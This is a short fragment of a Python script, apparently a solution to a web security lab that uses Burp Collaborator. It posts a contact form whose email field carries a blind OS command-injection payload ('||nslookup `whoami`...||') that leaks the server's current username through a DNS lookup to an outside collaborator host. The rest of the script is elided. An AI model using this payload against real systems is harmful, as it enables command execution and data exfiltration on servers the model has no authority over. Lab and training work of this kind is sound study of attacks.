...
if __name__ == "__main__":
    ...
    burp0_data = {"csrf": csrf_token, "name": "1", "email": f"email=x||nslookup `whoami`.{burp_url}||","subject": "a", "message": "a"}
    ...
    print("Unfortunately, it is impossible to automate this task more. You will have to paste the user you received in the collaborator to the answer yourself ")
